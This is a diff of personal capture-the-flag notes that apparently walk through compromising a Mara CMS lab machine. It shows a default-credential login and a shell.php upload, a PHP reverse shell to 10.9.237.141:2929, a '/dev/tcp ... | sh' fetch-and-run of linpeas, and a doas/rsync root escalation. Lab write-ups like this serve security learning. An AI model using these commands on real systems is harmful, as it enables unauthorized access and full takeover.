@@ -174,12 +174,12 @@ pasted the path in port 80 found CMS "http://10.10.141.8/YouGotTh3P@th/"
 
 GOT MARA CMS
 
-> used login to login admin:changme
+> used login at `http://10.10.196.252/YouGotTh3P@th/?login` to login admin:changme
 
-helloworld@1
+> After login ask for to change the passwd so `amdin:helloworld@1`
 
 
-now created a shell.php
+`now created a shell.php`
 
 ![](Attachments/Pasted%20image%2020240524012551.png)
 
@@ -196,7 +196,7 @@ uplaoded it and got RCE
 # INTIAL SHELL
 
 > used php revshell in burp and got revershell
-> payload : php -r '$sock=fsockopen("10.9.237.141",2929);shell_exec("sh <&3 >&3 2>&3");'
+> payload : `php -r '$sock=fsockopen("10.9.237.141",2929);shell_exec("sh <&3 >&3 2>&3");'`
 
 ![](Attachments/Pasted%20image%2020240524013243.png)
 
@@ -275,3 +275,51 @@ kiran@ubuntu-xenial:/var/backups$
 ```
 
 
+# FOr privsec run linpeas
+
+```shell
+www-data@ubuntu-xenial:/tmp$ cat < /dev/tcp/10.9.237.141/80 | sh
+
+
+                            ▄▄▄▄▄▄▄▄▄▄▄▄▄▄
+                    ▄▄▄▄▄▄▄             ▄▄▄▄▄▄▄▄
+             ▄▄▄▄▄▄▄      ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄  ▄▄▄▄
+         ▄▄▄▄     ▄ ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄ ▄▄▄▄▄▄
+         ▄    ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄
+         ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄ ▄▄▄▄▄       ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄
+         ▄▄▄▄▄▄▄▄▄▄▄          ▄▄▄▄▄▄               ▄▄▄▄▄▄ ▄
+         ▄▄▄▄▄▄              ▄▄▄▄▄▄▄▄                 ▄▄▄▄ 
+         ▄▄                  ▄▄▄ ▄▄▄▄▄                  ▄▄▄
+         ▄▄                ▄▄▄▄▄▄▄▄▄▄▄▄                  ▄▄
+         ▄            ▄▄ ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄   ▄▄
+         ▄      ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄
+         ▄▄▄▄▄▄▄▄▄▄▄▄▄▄                                ▄▄▄▄
+         ▄▄▄▄▄  ▄▄▄▄▄                       ▄▄▄▄▄▄     ▄▄▄▄
+         ▄▄▄▄   ▄▄▄▄▄                       ▄▄▄▄▄      ▄ ▄▄
+         ▄▄▄▄▄  ▄▄▄▄▄        ▄▄▄▄▄▄▄        ▄▄▄▄▄     ▄▄▄▄▄
+         ▄▄▄▄▄▄  ▄▄▄▄▄▄▄      ▄▄▄▄▄▄▄      ▄▄▄▄▄▄▄   ▄▄▄▄▄ 
+          ▄▄▄▄▄▄▄▄▄▄▄▄▄▄        ▄          ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄ 
+         ▄▄▄▄▄▄▄▄▄▄▄▄▄                       ▄▄▄▄▄▄▄▄▄▄▄▄▄▄
+         ▄▄▄▄▄▄▄▄▄▄▄                         ▄▄▄▄▄▄▄▄▄▄▄▄▄▄
+         ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄            ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄
+          ▀▀▄▄▄   ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄ ▄▄▄▄▄▄▄▀▀▀▀▀▀
+               ▀▀▀▄▄▄▄▄      ▄▄▄▄▄▄▄▄▄▄  ▄▄▄▄▄▄▀▀
+                     ▀▀▀▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▀▀▀
+
+
+```
+
+>after a closed look at  linpeas foond a software isntalled on system
+
+![](Attachments/Pasted%20image%2020240524205806.png)
+
+>`doas`
+
+got root
+```bash
+/dev/nullenial:/dev/shm$ doas -u root rsync -e 'sh -c "sh 0<&2 1>&2"' 127.0 
+# id
+uid=0(root) gid=0(root) groups=0(root)
+
+```
+![](Attachments/Pasted%20image%2020240524211511.png)
